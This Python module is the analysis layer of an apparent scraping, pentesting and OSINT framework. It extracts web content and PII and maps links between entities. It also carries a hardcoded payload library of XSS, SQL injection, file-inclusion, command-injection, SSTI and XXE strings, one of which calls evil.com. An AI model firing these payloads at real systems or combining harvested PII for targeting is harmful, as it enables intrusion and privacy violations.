"""
Analysis Layer - Sparkling-Owl-Spin Architecture
Layer 4: Processing & Analysis Layer (trafilatura/OpenNRE/PayloadsAllTheThings)
The Senses. Extracts and analyzes data.
"""

import asyncio
import logging
import json
import re
import time
from typing import Dict, List, Any, Optional, Union, Tuple
from dataclasses import dataclass
from enum import Enum
import hashlib
from pathlib import Path
from urllib.parse import urlparse, urljoin

logger = logging.getLogger(__name__)

class AnalysisType(Enum):
    """Types of analysis available"""
    CONTENT_EXTRACTION = "content_extraction"
    ENTITY_RECOGNITION = "entity_recognition"
    VULNERABILITY_ANALYSIS = "vulnerability_analysis"
    RELATIONSHIP_MAPPING = "relationship_mapping"
    PII_DETECTION = "pii_detection"
    SENTIMENT_ANALYSIS = "sentiment_analysis"
    MALWARE_DETECTION = "malware_detection"
    PAYLOAD_EFFECTIVENESS = "payload_effectiveness"

@dataclass
class Entity:
    """Extracted entity information"""
    text: str
    entity_type: str
    confidence: float
    context: str
    metadata: Dict[str, Any]

@dataclass
class Relationship:
    """Relationship between entities"""
    entity_1: Entity
    entity_2: Entity
    relationship_type: str
    confidence: float
    evidence: str

@dataclass 
class SecurityFinding:
    """Security vulnerability or finding"""
    finding_type: str
    severity: str  # LOW, MEDIUM, HIGH, CRITICAL
    title: str
    description: str
    affected_url: str
    evidence: List[str]
    remediation: str
    cvss_score: Optional[float]
    references: List[str]

class ContentExtractor:
    """Advanced content extraction using multiple methods"""
    
    def __init__(self):
        self.logger = logging.getLogger(self.__class__.__name__)
        self.extractors = {}
        
    async def initialize(self):
        """Initialize content extractors"""
        self.logger.info("📝 Initializing Content Extractors")
        
        # Initialize Trafilatura for web content
        try:
            import trafilatura
            self.extractors["trafilatura"] = trafilatura
            self.logger.info("✅ Trafilatura extractor loaded")
        except ImportError:
            self.logger.warning("Trafilatura not available")
            
        # Initialize Apache Tika for documents
        try:
            # This would normally connect to Tika server
            self.extractors["tika"] = self._mock_tika_extractor
            self.logger.info("✅ Tika extractor loaded (simulated)")
        except Exception as e:
            self.logger.warning(f"Tika extractor not available: {str(e)}")
            
        # Initialize BeautifulSoup for HTML parsing
        try:
            from bs4 import BeautifulSoup
            self.extractors["beautifulsoup"] = BeautifulSoup
            self.logger.info("✅ BeautifulSoup parser loaded")
        except ImportError:
            self.logger.warning("BeautifulSoup not available")
            
    async def extract_content(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Extract clean content from various sources"""
        content_type = data.get("content_type", "text/html")
        raw_content = data.get("content", "")
        url = data.get("url", "")
        
        result = {
            "extracted_text": "",
            "title": "",
            "author": "",
            "date": None,
            "language": "",
            "metadata": {},
            "extraction_method": "",
            "quality_score": 0.0
        }
        
        try:
            if content_type == "text/html" and "trafilatura" in self.extractors:
                # Use Trafilatura for web content
                extracted = self.extractors["trafilatura"].extract(
                    raw_content,
                    include_comments=False,
                    include_tables=True,
                    include_links=True
                )
                
                if extracted:
                    result["extracted_text"] = extracted
                    result["extraction_method"] = "trafilatura"
                    result["quality_score"] = 0.9
                    
                    # Extract metadata
                    metadata = self.extractors["trafilatura"].extract_metadata(raw_content)
                    if metadata:
                        result["title"] = metadata.title or ""
                        result["author"] = metadata.author or ""
                        result["date"] = metadata.date
                        result["metadata"] = {
                            "sitename": metadata.sitename,
                            "description": metadata.description,
                            "categories": metadata.categories,
                            "tags": metadata.tags
                        }
                        
            elif content_type.startswith("application/") and "tika" in self.extractors:
                # Use Tika for documents
                tika_result = await self.extractors["tika"](raw_content)
                result.update(tika_result)
                result["extraction_method"] = "tika"
                
            elif "beautifulsoup" in self.extractors:
                # Fallback to BeautifulSoup
                soup = self.extractors["beautifulsoup"](raw_content, 'html.parser')
                result["extracted_text"] = soup.get_text()
                result["title"] = soup.title.string if soup.title else ""
                result["extraction_method"] = "beautifulsoup"
                result["quality_score"] = 0.6
                
        except Exception as e:
            self.logger.error(f"Content extraction failed: {str(e)}")
            
        # Post-process extracted text
        result["extracted_text"] = self._clean_text(result["extracted_text"])
        
        return result
        
    def _clean_text(self, text: str) -> str:
        """Clean and normalize extracted text"""
        if not text:
            return ""
            
        # Remove excessive whitespace
        text = re.sub(r'\s+', ' ', text.strip())
        
        # Remove common HTML entities
        text = text.replace('&nbsp;', ' ')
        text = text.replace('&amp;', '&')
        text = text.replace('&lt;', '<')
        text = text.replace('&gt;', '>')
        
        return text
        
    async def _mock_tika_extractor(self, content: bytes) -> Dict[str, Any]:
        """Mock Tika extractor for demonstration"""
        return {
            "extracted_text": f"Extracted content from document ({len(content)} bytes)",
            "extraction_method": "tika_mock",
            "quality_score": 0.8,
            "metadata": {"content_length": len(content)}
        }

class EntityExtractor:
    """Named Entity Recognition and extraction"""
    
    def __init__(self):
        self.logger = logging.getLogger(self.__class__.__name__)
        self.patterns = self._load_patterns()
        
    def _load_patterns(self) -> Dict[str, List[str]]:
        """Load regex patterns for entity extraction"""
        return {
            "email": [
                r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
            ],
            "phone": [
                r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b',
                r'\b\+\d{1,3}[-.]?\d{3}[-.]?\d{3}[-.]?\d{4}\b',
                r'\b\d{2,3}[-.]?\d{6,8}\b'
            ],
            "ip_address": [
                r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
            ],
            "url": [
                r'https?://(?:[-\w.])+(?:[:\d]+)?(?:/(?:[\w/_.])*(?:\?(?:[\w&=%.])*)?(?:#(?:[\w.])*)?)?'
            ],
            "credit_card": [
                r'\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b'
            ],
            "ssn": [
                r'\b\d{3}[-]?\d{2}[-]?\d{4}\b'
            ],
            "swedish_personnummer": [
                r'\b\d{6}[-]?\d{4}\b',
                r'\b\d{8}[-]?\d{4}\b'
            ],
            "bitcoin_address": [
                r'\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b',
                r'\bbc1[a-z0-9]{39,59}\b'
            ],
            "hash_md5": [
                r'\b[a-f0-9]{32}\b'
            ],
            "hash_sha1": [
                r'\b[a-f0-9]{40}\b'
            ],
            "hash_sha256": [
                r'\b[a-f0-9]{64}\b'
            ]
        }
        
    async def extract_entities(self, text: str) -> List[Entity]:
        """Extract entities from text using regex patterns"""
        entities = []
        
        for entity_type, patterns in self.patterns.items():
            for pattern in patterns:
                matches = re.finditer(pattern, text, re.IGNORECASE)
                
                for match in matches:
                    entity_text = match.group()
                    start, end = match.span()
                    
                    # Get context around the entity
                    context_start = max(0, start - 50)
                    context_end = min(len(text), end + 50)
                    context = text[context_start:context_end]
                    
                    entity = Entity(
                        text=entity_text,
                        entity_type=entity_type,
                        confidence=0.8,  # Regex patterns have medium confidence
                        context=context,
                        metadata={
                            "position": (start, end),
                            "pattern_used": pattern
                        }
                    )
                    
                    entities.append(entity)
                    
        return entities
        
    async def extract_pii(self, text: str) -> List[Entity]:
        """Extract PII (Personally Identifiable Information)"""
        pii_types = ["email", "phone", "ssn", "swedish_personnummer", "credit_card"]
        pii_entities = []
        
        for entity_type in pii_types:
            if entity_type in self.patterns:
                for pattern in self.patterns[entity_type]:
                    matches = re.finditer(pattern, text, re.IGNORECASE)
                    
                    for match in matches:
                        entity = Entity(
                            text=match.group(),
                            entity_type=f"PII_{entity_type}",
                            confidence=0.9,
                            context=text[max(0, match.start()-30):match.end()+30],
                            metadata={
                                "sensitivity": "HIGH",
                                "requires_protection": True
                            }
                        )
                        pii_entities.append(entity)
                        
        return pii_entities

class PayloadLibrary:
    """Library of security testing payloads from PayloadsAllTheThings"""
    
    def __init__(self):
        self.logger = logging.getLogger(self.__class__.__name__)
        self.payloads = self._load_payloads()
        
    def _load_payloads(self) -> Dict[str, Dict[str, List[str]]]:
        """Load comprehensive payload library"""
        return {
            "xss": {
                "basic": [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "javascript:alert('XSS')",
                    "'\"><script>alert('XSS')</script>",
                    "<svg onload=alert('XSS')>",
                    "<iframe src=\"javascript:alert('XSS')\"></iframe>"
                ],
                "advanced": [
                    "<script>alert(String.fromCharCode(88,83,83))</script>",
                    "<img src=\"x\" onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))\">",
                    "<svg/onload=alert(1)>",
                    "<marquee onstart=alert('XSS')>",
                    "<details open ontoggle=alert('XSS')>"
                ],
                "bypass": [
                    "<ScRiPt>alert('XSS')</ScRiPt>",
                    "<script>al\\x65rt('XSS')</script>",
                    "<script>a\\u006cert('XSS')</script>",
                    "<img src=# onerror=\\u0061\\u006C\\u0065\\u0072\\u0074('XSS')>",
                    "<svg onload=\\u0061\\u006C\\u0065\\u0072\\u0074('XSS')>"
                ]
            },
            "sqli": {
                "basic": [
                    "' OR '1'='1",
                    "' OR 1=1--",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "admin'--",
                    "' OR '1'='1' #",
                    "') OR ('1'='1"
                ],
                "time_based": [
                    "'; WAITFOR DELAY '00:00:05'--",
                    "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                    "'; pg_sleep(5)--",
                    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)='1",
                    "1'; EXEC xp_cmdshell('ping -c 5 127.0.0.1'); --"
                ],
                "union": [
                    "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
                    "' UNION SELECT user(),database(),version()--",
                    "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
                    "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--"
                ]
            },
            "lfi": {
                "basic": [
                    "../../../etc/passwd",
                    "....//....//....//etc//passwd",
                    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                    "/var/log/apache2/access.log",
                    "/proc/self/environ"
                ],
                "encoded": [
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "..%252f..%252f..%252fetc%252fpasswd",
                    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
                ]
            },
            "rce": {
                "basic": [
                    "; ls -la",
                    "| whoami",
                    "&& id",
                    "; cat /etc/passwd",
                    "` ps aux `",
                    "$(whoami)"
                ],
                "encoded": [
                    ";%20ls%20-la",
                    "|%20whoami",
                    "$(echo%20whoami)",
                    "`echo%20whoami`"
                ]
            },
            "ssti": {
                "jinja2": [
                    "{{7*7}}",
                    "{{config}}",
                    "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
                ],
                "twig": [
                    "{{7*7}}",
                    "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
                    "{{'/etc/passwd'|file_excerpt(1,30)}}"
                ]
            },
            "csti": {
                "basic": [
                    "${7*7}",
                    "#{7*7}",
                    "{{7*7}}",
                    "${T(java.lang.System).getProperty(\"user.name\")}"
                ]
            },
            "xxe": {
                "basic": [
                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>',
                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/file.dtd"> ]><foo>&xxe;</foo>',
                    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>'
                ]
            }
        }
        
    def get_payloads(self, vulnerability_type: str, category: str = "basic") -> List[str]:
        """Get payloads for specific vulnerability type"""
        vuln_type = vulnerability_type.lower()
        if vuln_type in self.payloads:
            if category in self.payloads[vuln_type]:
                return self.payloads[vuln_type][category]
            else:
                # Return all payloads for the vulnerability type
                all_payloads = []
                for cat_payloads in self.payloads[vuln_type].values():
                    all_payloads.extend(cat_payloads)
                return all_payloads
        return []
        
    def get_all_payloads(self) -> Dict[str, List[str]]:
        """Get all payloads organized by vulnerability type"""
        all_payloads = {}
        for vuln_type, categories in self.payloads.items():
            all_payloads[vuln_type] = []
            for payloads in categories.values():
                all_payloads[vuln_type].extend(payloads)
        return all_payloads

class VulnerabilityAnalyzer:
    """Analyzes responses for vulnerability indicators"""
    
    def __init__(self):
        self.logger = logging.getLogger(self.__class__.__name__)
        self.signatures = self._load_vulnerability_signatures()
        
    def _load_vulnerability_signatures(self) -> Dict[str, List[Dict[str, str]]]:
        """Load vulnerability detection signatures"""
        return {
            "xss": [
                {"pattern": r"<script[^>]*>.*?</script>", "indicator": "script_execution"},
                {"pattern": r"alert\s*\(", "indicator": "javascript_alert"},
                {"pattern": r"document\.cookie", "indicator": "cookie_access"},
                {"pattern": r"onerror\s*=", "indicator": "event_handler"}
            ],
            "sqli": [
                {"pattern": r"SQL syntax.*error", "indicator": "sql_syntax_error"},
                {"pattern": r"mysql_fetch", "indicator": "mysql_error"},
                {"pattern": r"ORA-\d{5}", "indicator": "oracle_error"},
                {"pattern": r"PostgreSQL.*ERROR", "indicator": "postgresql_error"},
                {"pattern": r"Microsoft.*ODBC.*SQL Server", "indicator": "mssql_error"},
                {"pattern": r"sqlite3\.OperationalError", "indicator": "sqlite_error"}
            ],
            "lfi": [
                {"pattern": r"root:x:0:0:", "indicator": "passwd_file"},
                {"pattern": r"\[boot loader\]", "indicator": "boot_ini"},
                {"pattern": r"<Directory", "indicator": "apache_config"},
                {"pattern": r"127\.0\.0\.1\s+localhost", "indicator": "hosts_file"}
            ],
            "rce": [
                {"pattern": r"uid=\d+.*gid=\d+", "indicator": "id_command"},
                {"pattern": r"total \d+", "indicator": "ls_command"},
                {"pattern": r"Darwin|Linux|Windows NT", "indicator": "uname_output"},
                {"pattern": r"bash: .*: command not found", "indicator": "bash_error"}
            ],
            "ssti": [
                {"pattern": r"49", "indicator": "math_expression_7x7"},
                {"pattern": r"TemplateRuntimeError", "indicator": "template_error"},
                {"pattern": r"Traceback.*jinja2", "indicator": "jinja2_traceback"}
            ]
        }
        
    async def analyze_response(self, payload: str, response: Dict[str, Any], vulnerability_type: str) -> Dict[str, Any]:
        """Analyze response for vulnerability indicators"""
        result = {
            "vulnerable": False,
            "confidence": 0.0,
            "indicators": [],
            "evidence": [],
            "response_analysis": {
                "status_code": response.get("status_code", 0),
                "content_length": len(response.get("content", "")),
                "response_time": response.get("response_time", 0)
            }
        }
        
        content = response.get("content", "")
        
        # Check for vulnerability signatures
        if vulnerability_type.lower() in self.signatures:
            for signature in self.signatures[vulnerability_type.lower()]:
                pattern = signature["pattern"]
                indicator = signature["indicator"]
                
                if re.search(pattern, content, re.IGNORECASE | re.MULTILINE):
                    result["indicators"].append(indicator)
                    result["evidence"].append({
                        "payload": payload,
                        "indicator": indicator,
                        "pattern": pattern,
                        "context": self._extract_context(content, pattern)
                    })
                    
        # Determine vulnerability status
        if result["indicators"]:
            result["vulnerable"] = True
            result["confidence"] = min(0.9, len(result["indicators"]) * 0.3)
            
        # Additional response analysis
        result["response_analysis"].update(
            await self._analyze_response_characteristics(response, payload)
        )
        
        return result
        
    def _extract_context(self, content: str, pattern: str) -> str:
        """Extract context around pattern match"""
        match = re.search(pattern, content, re.IGNORECASE | re.MULTILINE)
        if match:
            start = max(0, match.start() - 100)
            end = min(len(content), match.end() + 100)
            return content[start:end]
        return ""
        
    async def _analyze_response_characteristics(self, response: Dict[str, Any], payload: str) -> Dict[str, Any]:
        """Analyze response characteristics for anomalies"""
        analysis = {
            "content_type": response.get("headers", {}).get("content-type", ""),
            "server": response.get("headers", {}).get("server", ""),
            "anomalies": []
        }
        
        # Check for unusual response times (potential time-based attacks)
        response_time = response.get("response_time", 0)
        if response_time > 5.0:  # 5+ second delay
            analysis["anomalies"].append("delayed_response")
            
        # Check for unusual status codes
        status_code = response.get("status_code", 200)
        if status_code == 500:
            analysis["anomalies"].append("server_error")
        elif status_code == 400:
            analysis["anomalies"].append("bad_request")
            
        # Check content length changes
        content = response.get("content", "")
        if len(content) == 0:
            analysis["anomalies"].append("empty_response")
        elif len(content) > 100000:  # Very large response
            analysis["anomalies"].append("unusually_large_response")
            
        return analysis

class RelationshipMapper:
    """Maps relationships between entities"""
    
    def __init__(self):
        self.logger = logging.getLogger(self.__class__.__name__)
        
    async def map_relationships(self, entities: List[Entity]) -> List[Relationship]:
        """Map relationships between entities"""
        relationships = []
        
        # Simple proximity-based relationship detection
        for i, entity1 in enumerate(entities):
            for j, entity2 in enumerate(entities[i+1:], i+1):
                relationship = await self._detect_relationship(entity1, entity2)
                if relationship:
                    relationships.append(relationship)
                    
        return relationships
        
    async def _detect_relationship(self, entity1: Entity, entity2: Entity) -> Optional[Relationship]:
        """Detect relationship between two entities"""
        # Check if entities are close in text (simple proximity)
        pos1 = entity1.metadata.get("position", (0, 0))
        pos2 = entity2.metadata.get("position", (0, 0))
        
        distance = abs(pos1[0] - pos2[0])
        
        if distance < 100:  # Within 100 characters
            relationship_type = self._classify_relationship(entity1, entity2)
            
            if relationship_type:
                return Relationship(
                    entity_1=entity1,
                    entity_2=entity2,
                    relationship_type=relationship_type,
                    confidence=0.7,
                    evidence=f"Entities found within {distance} characters"
                )
                
        return None
        
    def _classify_relationship(self, entity1: Entity, entity2: Entity) -> Optional[str]:
        """Classify the type of relationship between entities"""
        type1 = entity1.entity_type
        type2 = entity2.entity_type
        
        # Define relationship rules
        relationship_rules = {
            ("email", "phone"): "contact_info",
            ("email", "url"): "digital_presence",
            ("ip_address", "url"): "hosting_relationship",
            ("hash_md5", "url"): "file_reference",
            ("hash_sha1", "url"): "file_reference",
            ("hash_sha256", "url"): "file_reference"
        }
        
        # Check both directions
        for rule in [(type1, type2), (type2, type1)]:
            if rule in relationship_rules:
                return relationship_rules[rule]
                
        return None

class AnalysisLayer:
    """
    Main analysis layer coordinator
    Processes and analyzes all extracted data
    """
    
    def __init__(self, config):
        self.config = config
        self.logger = logging.getLogger(self.__class__.__name__)
        
        # Initialize analysis components
        self.content_extractor = ContentExtractor()
        self.entity_extractor = EntityExtractor()
        self.payload_library = PayloadLibrary()
        self.vulnerability_analyzer = VulnerabilityAnalyzer()
        self.relationship_mapper = RelationshipMapper()
        
        # Analysis cache
        self.analysis_cache = {}
        
        # Statistics
        self.stats = {
            "content_extractions": 0,
            "entities_extracted": 0,
            "vulnerabilities_found": 0,
            "relationships_mapped": 0,
            "pii_instances_found": 0
        }
        
    async def initialize(self):
        """Initialize analysis layer"""
        self.logger.info("🧠 Initializing Analysis Layer")
        
        await self.content_extractor.initialize()
        
        self.logger.info("✅ Analysis Layer initialized successfully")
        
    async def process_scraped_data(self, raw_data: Dict[str, Any]) -> Dict[str, Any]:
        """Process raw scraped data through analysis pipeline"""
        result = {
            "original_data": raw_data,
            "extracted_content": {},
            "entities": [],
            "relationships": [],
            "pii_found": [],
            "security_analysis": {},
            "metadata": {
                "processing_time": 0.0,
                "analysis_timestamp": time.time()
            }
        }
        
        start_time = time.time()
        
        try:
            # Extract clean content
            result["extracted_content"] = await self.content_extractor.extract_content(raw_data)
            self.stats["content_extractions"] += 1
            
            # Extract entities from content
            extracted_text = result["extracted_content"].get("extracted_text", "")
            if extracted_text:
                result["entities"] = await self.entity_extractor.extract_entities(extracted_text)
                self.stats["entities_extracted"] += len(result["entities"])
                
                # Extract PII
                result["pii_found"] = await self.entity_extractor.extract_pii(extracted_text)
                self.stats["pii_instances_found"] += len(result["pii_found"])
                
                # Map relationships
                all_entities = result["entities"] + result["pii_found"]
                result["relationships"] = await self.relationship_mapper.map_relationships(all_entities)
                self.stats["relationships_mapped"] += len(result["relationships"])
                
            # Security analysis of scraped content
            result["security_analysis"] = await self._analyze_security_aspects(raw_data)
            
        except Exception as e:
            self.logger.error(f"Error processing scraped data: {str(e)}")
            result["error"] = str(e)
            
        result["metadata"]["processing_time"] = time.time() - start_time
        
        return result
        
    async def extract_entities(self, data: Any) -> List[Entity]:
        """Extract entities from various data types"""
        if isinstance(data, str):
            return await self.entity_extractor.extract_entities(data)
        elif isinstance(data, dict):
            # Extract from content field
            content = data.get("content", "") or data.get("text", "")
            return await self.entity_extractor.extract_entities(str(content))
        else:
            return []
            
    async def map_relationships(self, entities: List[Entity]) -> List[Relationship]:
        """Map relationships between entities"""
        return await self.relationship_mapper.map_relationships(entities)
        
    async def generate_security_report(self, vulnerabilities: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Generate comprehensive security assessment report"""
        report = {
            "executive_summary": {
                "total_vulnerabilities": len(vulnerabilities),
                "critical_count": 0,
                "high_count": 0,
                "medium_count": 0,
                "low_count": 0,
                "overall_risk": "UNKNOWN"
            },
            "vulnerability_breakdown": {},
            "affected_systems": set(),
            "recommendations": [],
            "technical_details": vulnerabilities,
            "report_timestamp": time.time()
        }
        
        # Analyze vulnerability severity distribution
        severity_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
        vuln_types = {}
        
        for vuln in vulnerabilities:
            severity = vuln.get("severity", "UNKNOWN").upper()
            if severity in severity_counts:
                severity_counts[severity] += 1
                
            vuln_type = vuln.get("vulnerability_type", "unknown")
            vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
            
            affected_url = vuln.get("target", "")
            if affected_url:
                report["affected_systems"].add(urlparse(affected_url).netloc)
                
        report["executive_summary"].update(severity_counts)
        report["vulnerability_breakdown"] = vuln_types
        report["affected_systems"] = list(report["affected_systems"])
        
        # Determine overall risk
        if severity_counts["CRITICAL"] > 0:
            report["executive_summary"]["overall_risk"] = "CRITICAL"
        elif severity_counts["HIGH"] > 0:
            report["executive_summary"]["overall_risk"] = "HIGH"
        elif severity_counts["MEDIUM"] > 0:
            report["executive_summary"]["overall_risk"] = "MEDIUM"
        elif severity_counts["LOW"] > 0:
            report["executive_summary"]["overall_risk"] = "LOW"
        else:
            report["executive_summary"]["overall_risk"] = "MINIMAL"
            
        # Generate recommendations
        report["recommendations"] = self._generate_recommendations(vulnerabilities, severity_counts)
        
        return report
        
    def _generate_recommendations(self, vulnerabilities: List[Dict[str, Any]], severity_counts: Dict[str, int]) -> List[str]:
        """Generate security recommendations based on findings"""
        recommendations = []
        
        if severity_counts["CRITICAL"] > 0:
            recommendations.append("IMMEDIATE ACTION REQUIRED: Critical vulnerabilities found that allow for system compromise")
            
        if severity_counts["HIGH"] > 0:
            recommendations.append("High priority vulnerabilities should be patched within 24-48 hours")
            
        # Type-specific recommendations
        vuln_types = set(vuln.get("vulnerability_type", "") for vuln in vulnerabilities)
        
        if "xss" in vuln_types:
            recommendations.append("Implement proper input validation and output encoding to prevent XSS attacks")
            
        if "sqli" in vuln_types:
            recommendations.append("Use parameterized queries and input validation to prevent SQL injection")
            
        if "lfi" in vuln_types:
            recommendations.append("Validate and sanitize file path parameters to prevent local file inclusion")
            
        if "rce" in vuln_types:
            recommendations.append("Implement strict input validation and avoid system command execution with user input")
            
        if not recommendations:
            recommendations.append("Continue regular security assessments and monitoring")
            
        return recommendations
        
    async def create_integrated_report(self, scraping_results: Dict[str, Any], 
                                     pentest_results: Dict[str, Any], 
                                     osint_results: Dict[str, Any]) -> Dict[str, Any]:
        """Create integrated analysis report from all mission types"""
        report = {
            "mission_overview": {
                "scraping_targets": len(scraping_results.get("targets_processed", [])),
                "pentest_targets": len(pentest_results.get("targets_tested", [])),
                "osint_operations": len(osint_results.get("intelligence_gathered", {})),
                "total_entities": 0,
                "total_vulnerabilities": len(pentest_results.get("vulnerabilities_found", [])),
                "pii_instances": 0
            },
            "cross_correlation": {},
            "threat_assessment": {},
            "actionable_intelligence": [],
            "integrated_timeline": [],
            "report_metadata": {
                "generation_time": time.time(),
                "analysis_methods": ["content_extraction", "entity_recognition", "vulnerability_analysis"]
            }
        }
        
        # Aggregate entities from all sources
        all_entities = []
        
        # Extract entities from scraping results
        for target_data in scraping_results.get("data_extracted", {}).values():
            entities = target_data.get("entities", [])
            all_entities.extend(entities)
            
        # Extract entities from OSINT results
        for intel_data in osint_results.get("intelligence_gathered", {}).values():
            if isinstance(intel_data, str):
                entities = await self.entity_extractor.extract_entities(intel_data)
                all_entities.extend(entities)
                
        report["mission_overview"]["total_entities"] = len(all_entities)
        
        # Count PII instances
        pii_count = 0
        for target_data in scraping_results.get("data_extracted", {}).values():
            pii_count += len(target_data.get("pii_found", []))
        report["mission_overview"]["pii_instances"] = pii_count
        
        # Cross-correlation analysis
        report["cross_correlation"] = await self._cross_correlate_findings(
            all_entities, 
            pentest_results.get("vulnerabilities_found", [])
        )
        
        # Threat assessment
        report["threat_assessment"] = self._assess_integrated_threats(
            scraping_results, pentest_results, osint_results
        )
        
        # Generate actionable intelligence
        report["actionable_intelligence"] = self._generate_actionable_intelligence(
            all_entities, pentest_results.get("vulnerabilities_found", [])
        )
        
        return report
        
    async def _analyze_security_aspects(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Analyze security aspects of scraped data"""
        analysis = {
            "sensitive_data_found": False,
            "security_headers": {},
            "potential_attack_vectors": [],
            "exposed_technologies": []
        }
        
        # Check for sensitive data exposure
        content = data.get("content", "")
        pii_entities = await self.entity_extractor.extract_pii(content)
        analysis["sensitive_data_found"] = len(pii_entities) > 0
        
        # Analyze HTTP headers for security
        headers = data.get("headers", {})
        security_headers = [
            "strict-transport-security", "content-security-policy", 
            "x-frame-options", "x-content-type-options", "x-xss-protection"
        ]
        
        for header in security_headers:
            if header in headers:
                analysis["security_headers"][header] = headers[header]
            else:
                analysis["potential_attack_vectors"].append(f"missing_{header}")
                
        # Detect exposed technologies
        server_header = headers.get("server", "")
        if server_header:
            analysis["exposed_technologies"].append(server_header)
            
        return analysis
        
    async def _cross_correlate_findings(self, entities: List[Entity], vulnerabilities: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Cross-correlate entities with vulnerabilities"""
        correlation = {
            "entity_vulnerability_pairs": [],
            "high_risk_combinations": [],
            "correlation_confidence": 0.0
        }
        
        # Simple correlation based on URL/target matching
        for entity in entities:
            for vuln in vulnerabilities:
                if entity.entity_type == "url" and entity.text == vuln.get("target"):
                    correlation["entity_vulnerability_pairs"].append({
                        "entity": entity.text,
                        "vulnerability": vuln.get("vulnerability_type"),
                        "risk_level": vuln.get("severity")
                    })
                    
        correlation["correlation_confidence"] = min(1.0, len(correlation["entity_vulnerability_pairs"]) * 0.2)
        
        return correlation
        
    def _assess_integrated_threats(self, scraping_results: Dict[str, Any], 
                                  pentest_results: Dict[str, Any], 
                                  osint_results: Dict[str, Any]) -> Dict[str, Any]:
        """Assess integrated threat landscape"""
        assessment = {
            "threat_level": "LOW",
            "attack_surface": [],
            "data_exposure_risk": "LOW",
            "infrastructure_vulnerabilities": len(pentest_results.get("vulnerabilities_found", [])),
            "intelligence_value": "MEDIUM"
        }
        
        # Assess threat level based on vulnerabilities
        critical_vulns = [v for v in pentest_results.get("vulnerabilities_found", []) 
                         if v.get("severity") == "CRITICAL"]
        high_vulns = [v for v in pentest_results.get("vulnerabilities_found", []) 
                     if v.get("severity") == "HIGH"]
                     
        if critical_vulns:
            assessment["threat_level"] = "CRITICAL"
        elif high_vulns:
            assessment["threat_level"] = "HIGH"
        elif pentest_results.get("vulnerabilities_found"):
            assessment["threat_level"] = "MEDIUM"
            
        # Assess data exposure risk
        total_pii = 0
        for target_data in scraping_results.get("data_extracted", {}).values():
            total_pii += len(target_data.get("pii_found", []))
            
        if total_pii > 10:
            assessment["data_exposure_risk"] = "HIGH"
        elif total_pii > 0:
            assessment["data_exposure_risk"] = "MEDIUM"
            
        return assessment
        
    def _generate_actionable_intelligence(self, entities: List[Entity], 
                                        vulnerabilities: List[Dict[str, Any]]) -> List[str]:
        """Generate actionable intelligence from analysis"""
        intelligence = []
        
        # Vulnerability-based actions
        critical_vulns = [v for v in vulnerabilities if v.get("severity") == "CRITICAL"]
        if critical_vulns:
            intelligence.append(f"URGENT: {len(critical_vulns)} critical vulnerabilities require immediate patching")
            
        # Entity-based actions
        email_entities = [e for e in entities if e.entity_type == "email"]
        if email_entities:
            intelligence.append(f"Identified {len(email_entities)} email addresses for social engineering assessment")
            
        ip_entities = [e for e in entities if e.entity_type == "ip_address"]
        if ip_entities:
            intelligence.append(f"Discovered {len(ip_entities)} IP addresses for network reconnaissance")
            
        return intelligence
        
    async def get_status(self) -> Dict[str, Any]:
        """Get analysis layer status"""
        return {
            "healthy": True,
            "components_initialized": {
                "content_extractor": self.content_extractor is not None,
                "entity_extractor": self.entity_extractor is not None,
                "payload_library": self.payload_library is not None,
                "vulnerability_analyzer": self.vulnerability_analyzer is not None
            },
            "statistics": self.stats.copy(),
            "cache_size": len(self.analysis_cache)
        }
        
    async def cleanup(self):
        """Cleanup analysis layer resources"""
        self.logger.info("🧹 Cleaning up Analysis Layer")
        
        # Clear caches
        self.analysis_cache.clear()
        
        # Reset statistics
        for key in self.stats:
            self.stats[key] = 0
            
        self.logger.info("✅ Analysis Layer cleanup completed")
